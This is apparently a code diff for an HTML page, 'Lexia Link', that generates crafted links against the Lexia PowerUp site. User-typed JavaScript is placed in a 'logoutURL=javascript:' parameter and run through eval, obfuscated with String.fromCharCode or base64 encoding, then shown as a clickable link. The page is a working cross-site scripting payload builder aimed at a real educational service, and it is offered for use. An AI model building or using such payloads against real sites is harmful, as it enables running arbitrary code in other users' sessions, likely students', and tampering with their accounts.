@@ -127,37 +127,62 @@
     <textarea id="textInput" placeholder="Type code here..."></textarea>
   
     <h2>Lexia Link</h2>
-    <pre id="textOutput"></pre>
+    <pre id="textOutput">Type something first...</pre>
+	<a id="link" href>Open link</a>
 
     <script>
         var input = document.getElementById('textInput');
         var output = document.getElementById('textOutput');
         var toggleSwitch = document.getElementById('toggleSwitch');
         var statusText = document.getElementById('statusText');
+        var link_a = document.getElementById("link");
         var url = "https://www.lexiapowerup.com/welcome?siteId=1234&logoutURL=javascript:";
         var js = false;
 
-        function textToCharCodes(text) {
+        function encodeToCharCode(str) {
             const codes = [];
-            for (let i = 0; i < text.length; i++) {
-                codes.push(text.charCodeAt(i));
+            for (let i = 0; i < str.length; i++) {
+                codes.push(str.charCodeAt(i));
             }
-            return codes;
+            return `String.fromCharCode(${codes.join(",")})`;
+        }
+
+        function encodeToUrlB64(str) {
+            const b64 = btoa(unescape(encodeURIComponent(str)))
+                .replace(/\+/g, "-") // url-safe '+'
+                .replace(/\//g, "_") // url-safe '/'
+                .replace(/=+$/, ""); // no padding
+            
+            let inner = `'${b64}'`;
+            if (b64.includes("-")) inner += `.replace(/-/g,'\\x2b')`;
+            if (b64.includes("_")) inner += `.replace(/_/g,'/'')`;
+
+            return `decodeURIComponent(escape(atob(${inner})))`;
+        }
+
+        function encodeText(str) {
+            const a = encodeToCharCode(str);
+            const b = encodeToUrlB64(str);
+            return a.length <= b.length ? a : b;
         }
 
         function onInput() {
-            var texty = input.value;
-            if (!texty) {
-                output.textContent = "Enter code first...";
-                return;
+            const text = input.value;
+            let linkContent = "javascript:alert('Enter something first!')";
+            let outputContent = "Enter code first...";
+            if (text) {
+                let code;
+                if (js) {
+                    code = text;
+                } else {
+                    code = "document.innerHTML = " + JSON.stringify(text) + ";"
+                }
+                const new_url = url + "eval(" + encodeText(code) + ");";
+                outputContent = new_url;
+                linkContent = new_url;
             }
-            var code;
-            if (js) {
-                code = texty;
-            } else {
-                code = "document.innerHtml = " + JSON.stringify(texty) + ";"
-            }
-            output.textContent = url + "eval(String.fromCharCode(" + textToCharCodes(code) + "));";
+            output.textContent = outputContent;
+            link_a.href = linkContent;
         }
 
         function onSwitch() {
@@ -173,9 +198,7 @@
 
         toggleSwitch.addEventListener('change', onSwitch);
         input.addEventListener('input', onInput);
-        onInput();
+        onSwitch();
     </script>
-
 </body>
-
 </html>
